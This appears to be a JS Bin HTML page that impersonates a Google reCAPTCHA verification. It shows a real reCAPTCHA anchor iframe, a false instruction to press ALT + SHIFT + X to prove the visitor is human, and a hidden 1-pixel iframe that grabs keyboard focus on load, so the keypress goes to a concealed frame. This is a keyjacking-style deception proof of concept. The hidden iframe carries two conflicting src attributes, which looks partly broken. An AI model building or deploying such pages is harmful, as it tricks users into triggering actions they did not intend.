<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width">
  <link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
  <title>JS Bin</title>
  <style type="text/css">
    body {
      font-family: 'Roboto', sans-serif;
    }

    .logo {
      height: 30px;
      margin: 5px 10px;
      float: left;
    }

    h3 {
      border-bottom: 1px solid #d4dff6;
      color: #292636;
      font-size: 32px;
      font-weight: 300;
      letter-spacing: -.02em;
      line-height: 1.3em;
      margin: 20px 0 0 0;
      padding: 0 15px 18px 15px;
    }

    .wrapper iframe {
      margin: 30px;
    }

    #edit-with-js-bin {
      display: none !important;
    }
  </style>
</head>
<body>
  <img class="logo" src="https://www.google.com/recaptcha/intro/comingsoon/reCAPTCHA_logo.png" alt="">
  <h3>Please verify you are not a robot by pressing ALT + SHIFT + X</h3>
  <div class="wrapper">
    <iframe src="https://www.google.com/recaptcha/api2/anchor?k=6Le-wvkSAAAAAPBMRTvw0Q4Muexq9bi0DJwx_mJ-&co=aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbTo0NDM.&hl=en&v=r20170823151541&size=normal&cb=q10i4ohlnep" frameborder="0" scrolling="no" width="304" height="78"></iframe>
  </div>
  <iframe src="" frameborder="0" height="1px" width="1px" onload="this.contentWindow.focus()" src="http://example.com/"></iframe>
</body>
</html>
